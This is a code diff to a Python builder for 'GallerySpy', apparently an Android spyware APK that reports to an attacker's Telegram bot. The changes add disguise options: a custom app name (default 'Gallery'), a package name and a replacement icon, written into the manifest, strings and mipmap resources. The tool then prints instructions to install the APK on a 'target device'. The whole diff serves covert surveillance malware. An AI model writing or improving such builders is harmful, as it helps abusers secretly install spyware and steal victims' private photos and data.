@@ -102,7 +102,7 @@ class GallerySpyBuilder:
             return False
     
     def get_config(self):
-        """Get Telegram configuration"""
+        """Get build configuration"""
         print(f"{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════════════════════════{Colors.END}")
         print(f"{Colors.BOLD}{Colors.CYAN}           TELEGRAM CONFIGURATION                          {Colors.END}")
         print(f"{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════════════════════════{Colors.END}\n")
@@ -124,9 +124,49 @@ class GallerySpyBuilder:
         self.config['bot_token'] = bot_token
         self.config['chat_id'] = chat_id
         
-        print(f"\n{Colors.GREEN}[✓] Configuration complete{Colors.END}")
+        print(f"\n{Colors.GREEN}[✓] Telegram configured{Colors.END}")
         print(f"{Colors.CYAN}Bot Token:{Colors.END} {bot_token[:20]}...")
         print(f"{Colors.CYAN}Chat ID:{Colors.END}   {chat_id}\n")
+        
+        # App Customization
+        print(f"{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════════════════════════{Colors.END}")
+        print(f"{Colors.BOLD}{Colors.CYAN}           APP CUSTOMIZATION                               {Colors.END}")
+        print(f"{Colors.BOLD}{Colors.CYAN}═══════════════════════════════════════════════════════════{Colors.END}\n")
+        
+        # App Name
+        self.config['app_name'] = input(f"{Colors.YELLOW}[?] App Name (default: Gallery): {Colors.END}").strip() or "Gallery"
+        
+        # Package Name
+        self.config['package'] = input(f"{Colors.YELLOW}[?] Package (default: com.photo.gallery): {Colors.END}").strip() or "com.photo.gallery"
+        
+        # Icon
+        try:
+            from PIL import Image
+            PIL_AVAILABLE = True
+        except:
+            PIL_AVAILABLE = False
+        
+        if PIL_AVAILABLE:
+            icon_prompt = f"{Colors.YELLOW}[?] Icon path (press Enter to skip): {Colors.END}"
+            icon_path = input(icon_prompt).strip()
+            
+            if icon_path:
+                icon_file = Path(icon_path)
+                if icon_file.exists():
+                    self.config['icon'] = icon_file
+                    print(f"{Colors.GREEN}[✓] Icon will be changed: {icon_file.name}{Colors.END}")
+                else:
+                    self.config['icon'] = None
+                    print(f"{Colors.YELLOW}[!] Icon not found, using default{Colors.END}")
+            else:
+                self.config['icon'] = None
+                print(f"{Colors.YELLOW}[!] Using default icon{Colors.END}")
+        else:
+            self.config['icon'] = None
+            print(f"{Colors.YELLOW}[!] Pillow not installed, icon change disabled{Colors.END}")
+            print(f"{Colors.YELLOW}[!] Install: pip install Pillow{Colors.END}")
+        
+        print(f"\n{Colors.GREEN}[✓] Configuration complete{Colors.END}\n")
         
         return True
     
@@ -241,6 +281,107 @@ class GallerySpyBuilder:
         
         print(f"\r{Colors.GREEN}[✓] Telegram configured in all files{Colors.END}" + " " * 30)
         return True
+    
+    def modify_manifest(self):
+        """Modify AndroidManifest.xml"""
+        manifest_file = self.work_dir / "AndroidManifest.xml"
+        
+        if not manifest_file.exists():
+            return True
+        
+        try:
+            with open(manifest_file, 'r', encoding='utf-8') as f:
+                content = f.read()
+            
+            # Update app label
+            content = re.sub(
+                r'android:label="[^"]*"',
+                f'android:label="{self.config["app_name"]}"',
+                content,
+                count=1
+            )
+            
+            # Update package name
+            content = re.sub(
+                r'package="[^"]*"',
+                f'package="{self.config["package"]}"',
+                content
+            )
+            
+            with open(manifest_file, 'w', encoding='utf-8') as f:
+                f.write(content)
+            
+            return True
+            
+        except Exception as e:
+            print(f"\r{Colors.YELLOW}[!] Warning: Failed to update manifest: {e}{Colors.END}")
+            return True
+    
+    def modify_strings(self):
+        """Modify strings.xml"""
+        strings_file = self.work_dir / "res/values/strings.xml"
+        
+        if not strings_file.exists():
+            return True
+        
+        try:
+            with open(strings_file, 'r', encoding='utf-8') as f:
+                content = f.read()
+            
+            # Update app name
+            content = re.sub(
+                r'<string name="app_name">[^<]*</string>',
+                f'<string name="app_name">{self.config["app_name"]}</string>',
+                content
+            )
+            
+            with open(strings_file, 'w', encoding='utf-8') as f:
+                f.write(content)
+            
+            return True
+            
+        except Exception as e:
+            print(f"\r{Colors.YELLOW}[!] Warning: Failed to update strings: {e}{Colors.END}")
+            return True
+    
+    def change_icon(self):
+        """Change app icon"""
+        if not self.config.get('icon'):
+            return True
+        
+        try:
+            from PIL import Image
+            
+            icon_sizes = {
+                'mdpi': 48,
+                'hdpi': 72,
+                'xhdpi': 96,
+                'xxhdpi': 144,
+                'xxxhdpi': 192
+            }
+            
+            original_icon = Image.open(self.config['icon'])
+            
+            if original_icon.mode != 'RGBA':
+                original_icon = original_icon.convert('RGBA')
+            
+            for density, size in icon_sizes.items():
+                mipmap_dir = self.work_dir / f"res/mipmap-{density}"
+                
+                if mipmap_dir.exists():
+                    resized_icon = original_icon.resize((size, size), Image.Resampling.LANCZOS)
+                    
+                    icon_file = mipmap_dir / "ic_launcher.png"
+                    resized_icon.save(icon_file, 'PNG')
+                    
+                    round_icon_file = mipmap_dir / "ic_launcher_round.png"
+                    resized_icon.save(round_icon_file, 'PNG')
+            
+            return True
+            
+        except Exception as e:
+            print(f"\r{Colors.YELLOW}[!] Warning: Failed to change icon: {e}{Colors.END}")
+            return True
     
     def rebuild_apk(self):
         """Rebuild APK using apktool"""
@@ -397,7 +538,7 @@ class GallerySpyBuilder:
         self.output_dir.mkdir(parents=True, exist_ok=True)
         
         timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-        filename = f"GallerySpy_{timestamp}.apk"
+        filename = f"GallerySpy_{self.config['app_name'].replace(' ', '_')}_{timestamp}.apk"
         final_apk = self.output_dir / filename
         
         shutil.copy2(signed_apk, final_apk)
@@ -409,8 +550,12 @@ class GallerySpyBuilder:
         print(f"{Colors.BOLD}{Colors.GREEN}═══════════════════════════════════════════════════════════{Colors.END}")
         print(f"{Colors.CYAN}APK:{Colors.END}          {final_apk}")
         print(f"{Colors.CYAN}Size:{Colors.END}         {size_mb:.2f} MB")
+        print(f"{Colors.CYAN}App Name:{Colors.END}     {self.config['app_name']}")
+        print(f"{Colors.CYAN}Package:{Colors.END}      {self.config['package']}")
         print(f"{Colors.CYAN}Bot Token:{Colors.END}    {self.config['bot_token'][:20]}...")
         print(f"{Colors.CYAN}Chat ID:{Colors.END}      {self.config['chat_id']}")
+        if self.config.get('icon'):
+            print(f"{Colors.CYAN}Icon:{Colors.END}         Changed")
         print(f"{Colors.BOLD}{Colors.GREEN}═══════════════════════════════════════════════════════════{Colors.END}")
         print(f"\n{Colors.BOLD}{Colors.YELLOW}[*] INSTALLATION:{Colors.END}")
         print(f"{Colors.GREEN}    1. Install APK on target device{Colors.END}")
@@ -437,8 +582,24 @@ class GallerySpyBuilder:
             return
         
         try:
+            print(f"{Colors.CYAN}[*] Applying configuration...{Colors.END}", end='', flush=True)
+            
             if not self.modify_telegram_config():
                 return
+            
+            if not self.modify_manifest():
+                return
+            
+            if not self.modify_strings():
+                return
+            
+            print(f"\r{Colors.GREEN}[✓] Configuration applied{Colors.END}" + " " * 30)
+            
+            if self.config.get('icon'):
+                print(f"{Colors.CYAN}[*] Preparing icon...{Colors.END}", end='', flush=True)
+                if not self.change_icon():
+                    return
+                print(f"\r{Colors.GREEN}[✓] Icon changed{Colors.END}" + " " * 30)
             
             unsigned_apk = self.rebuild_apk()
             if not unsigned_apk:
